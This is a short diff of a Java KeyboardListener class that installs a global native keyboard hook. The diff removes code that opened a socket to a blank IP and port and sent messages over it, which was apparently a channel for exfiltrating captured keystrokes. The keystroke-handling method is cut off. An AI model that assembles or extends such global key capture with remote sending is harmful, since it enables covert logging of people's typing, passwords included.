@@ -11,28 +11,14 @@ import java.net.Socket;
 
 public class KeyboardListener implements NativeKeyListener {
 
-    public static final String IP = "";
-    public static final int PORT = 1;
-
-    private static PrintWriter sender;
-
     public static void startTrackingKeyboard() {
+
         try {
-            startConnection();
             GlobalScreen.registerNativeHook();
             GlobalScreen.addNativeKeyListener(new KeyboardListener());
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
-    }
-
-    private static void startConnection() throws IOException {
-        Socket socket = new Socket(IP, PORT);
-        sender = new PrintWriter(socket.getOutputStream(), true);
-    }
-
-    private static void sendMessage(String message) {
-        sender.println(message);
     }
 
     @Override
